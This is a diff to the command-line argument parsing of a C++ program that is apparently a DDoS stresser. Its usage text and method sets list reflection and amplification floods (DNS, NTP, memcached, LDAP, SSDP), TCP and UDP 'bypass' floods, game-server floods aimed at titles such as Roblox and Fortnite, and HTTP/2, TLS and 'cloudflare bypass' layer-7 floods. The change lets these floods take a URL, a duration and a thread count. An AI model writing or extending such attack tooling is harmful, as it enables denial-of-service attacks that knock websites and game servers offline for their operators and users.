@@ -982,34 +982,16 @@ int main(int argc, char *argv[]) {
     int arg_offset = 1;
     if (method.find("flood") != std::string::npos ||
         method == "aio" || method == "all") {
-        if (argc < 5) {
-            std::cerr << "Usage: " << argv[0]
-                      << " <method> <host/url> <port> <time_seconds> [threads]\n"
-                      << "\nL4 UDP  : dns udp ldap ssdp ntp memcached udpbypass home\n"
-                      << "L4 TCP  : tcp socket ovh tcpmix tcpbypass ack slowloris\n"
-                      << "L4 GAME : game rainbow rocket roblox fivem pubg fortnite warthunder counter samp minecraft\n"
-                      << "L3      : icmp subnet\n"
-                      << "L7 H1   : http https httpx browser\n"
-                      << "L7 H2   : http2 tls tlsx cloudflare bypass cache rapidflood\n";
+        if (argc < 3) {
+            std::cerr << "Usage:\n"
+                      << "  L4: " << argv[0] << " <method> <host> <port> <time_seconds> [threads]\n"
+                      << "  L7: " << argv[0] << " <method> <url> <time_seconds> [threads]\n";
             return 1;
         }
         method = argv[1];
         arg_offset = 2;
     }
 
-    if (argc < arg_offset + 3) {
-        std::cerr << "Usage: " << argv[0] << " <host/url> <port> <time_seconds> [threads]\n";
-        return 1;
-    }
-
-    std::string raw_target = argv[arg_offset];
-    int port     = std::atoi(argv[arg_offset + 1]);
-    int duration = std::atoi(argv[arg_offset + 2]);
-    int threads  = (argc > arg_offset + 3) ? std::atoi(argv[arg_offset + 3]) : 4;
-    if (threads  <= 0) threads  = 4;
-    if (duration <= 0) duration = 10;
-
-    // Categorise method
     static const std::set<std::string> L7_H2_METHODS = {
         "http2","tls","tlsx","cloudflare","bypass","cache","rapidflood"
     };
@@ -1019,6 +1001,66 @@ int main(int argc, char *argv[]) {
     static const std::set<std::string> L7_H1_HTTP_METHODS = {
         "http","httpx","browser","get","post","head"
     };
+
+    bool is_l7_check = (L7_H2_METHODS.count(method) > 0 ||
+                        L7_H1_HTTPS_METHODS.count(method) > 0 ||
+                        L7_H1_HTTP_METHODS.count(method) > 0);
+
+    std::string raw_target;
+    int port = 0;
+    int duration = 10;
+    int threads = 4;
+
+    if (is_l7_check) {
+        // L7 method can be: ./flood <method> <url> <time> [threads] (3 or 4 args)
+        // or legacy: ./flood <method> <url> <port> <time> [threads] (5 args)
+        if (argc < arg_offset + 2) {
+            std::cerr << "Usage: " << argv[0] << " " << method << " <url> <time_seconds> [threads]\n";
+            return 1;
+        }
+        raw_target = argv[arg_offset];
+
+        if (argc == arg_offset + 2) {
+            // <url> <time>
+            duration = std::atoi(argv[arg_offset + 1]);
+        } else if (argc >= arg_offset + 3) {
+            // check if next is port or time
+            int val1 = std::atoi(argv[arg_offset + 1]);
+            int val2 = std::atoi(argv[arg_offset + 2]);
+            if (argc == arg_offset + 3) {
+                // <url> <time> <threads> OR <url> <port> <time>
+                // If val1 is small or looks like time (e.g. 10..300) and no 4th arg
+                // or if url has http
+                if (val2 <= 64 && val1 >= 1) {
+                    duration = val1;
+                    threads = val2;
+                } else {
+                    port = val1;
+                    duration = val2;
+                }
+            } else {
+                // 4 or more args after target
+                port = val1;
+                duration = val2;
+                threads = std::atoi(argv[arg_offset + 3]);
+            }
+        }
+    } else {
+        // L4 requires <host> <port> <time>
+        if (argc < arg_offset + 3) {
+            std::cerr << "Usage: " << argv[0] << " " << method << " <host> <port> <time_seconds> [threads]\n";
+            return 1;
+        }
+        raw_target = argv[arg_offset];
+        port     = std::atoi(argv[arg_offset + 1]);
+        duration = std::atoi(argv[arg_offset + 2]);
+        if (argc > arg_offset + 3) threads = std::atoi(argv[arg_offset + 3]);
+    }
+
+    if (threads  <= 0) threads  = 4;
+    if (duration <= 0) duration = 10;
+
+    // Categorise method
     static const std::set<std::string> L4_GAME_METHODS = {
         "game","rainbow","rocket","roblox","fivem","pubg","fortnite",
         "warthunder","counter","samp","minecraft"
